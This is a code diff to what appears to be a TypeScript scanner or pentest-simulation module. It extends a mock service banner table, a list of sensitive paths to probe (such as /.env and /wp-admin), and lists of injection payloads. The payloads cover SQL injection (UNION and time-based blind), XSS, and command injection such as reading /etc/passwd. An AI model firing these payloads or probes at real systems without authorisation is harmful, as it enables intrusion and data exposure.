@@ -20,10 +20,13 @@ When providing reports:
 export const MOCK_SERVICES: Record<number, string> = {
   21: 'FTP (vsftpd 3.0.5 - 2026 Patch)',
   22: 'SSH (OpenSSH 9.8p1)',
+  53: 'DNS (ISC BIND 9.18.24)',
   80: 'HTTP (Apache 2.4.62)',
+  161: 'SNMP (Net-SNMP 5.9.4)',
   443: 'HTTPS (Nginx 1.27.1)',
   445: 'SMB (Samba 4.21.0)',
   3306: 'MySQL 8.4.2',
+  5432: 'PostgreSQL 16.2',
   8080: 'HTTP-Proxy (Tomcat 11.0)'
 };
 
@@ -37,11 +40,33 @@ export const COMMON_DIRECTORIES = [
   '/.env',
   '/api/v1/debug',
   '/dev/null',
-  '/graphql'
+  '/graphql',
+  '/v3/auth/provider',
+  '/internal/status',
+  '/wp-admin',
+  '/node_modules'
 ];
 
 export const INJECTION_PAYLOADS = {
-  SQLI: ["' OR 1=1 --", "') UNION SELECT null,@@version --", "admin' --"],
-  XSS: ["<script>alert('LF47')</script>", "javascript:alert(1)", "<img src=x onerror=alert(1)>"],
-  CMD: ["; cat /etc/passwd", "| id", "`whoami`", "$(ls -la)"]
+  SQLI: [
+    "' OR 1=1 --", 
+    "') UNION SELECT null,@@version,user(),database() --", 
+    "admin' --",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+  ],
+  XSS: [
+    "<script>alert('LF47_XSS')</script>", 
+    "javascript:alert(1)", 
+    "<img src=x onerror=alert('LF47')>",
+    "<svg onload=alert(1)>",
+    "'-alert(1)-'"
+  ],
+  CMD: [
+    "; cat /etc/passwd", 
+    "| id", 
+    "`whoami`", 
+    "$(ls -la)",
+    "& ping -c 4 127.0.0.1 &"
+  ]
 };
